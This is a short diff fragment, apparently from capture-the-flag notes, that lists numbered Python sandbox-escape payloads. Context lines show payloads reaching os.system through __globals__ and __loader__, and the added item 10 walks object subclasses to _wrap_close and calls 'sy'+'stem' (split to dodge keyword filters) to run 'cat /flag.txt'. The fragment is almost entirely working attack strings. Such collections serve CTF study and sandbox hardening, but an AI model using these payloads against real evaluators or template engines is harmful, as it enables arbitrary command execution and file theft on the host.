@@ -20,6 +20,14 @@
 8. __class__.__init__.__globals__.__getitem__ FLAG
 
 9. add __loader__().load_module('os').system('cat flag.txt')
+
+10. [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['sy'+'stem']('cat /flag.txt')
+```
+
+```py
+
+11.
+
 ```
 
 
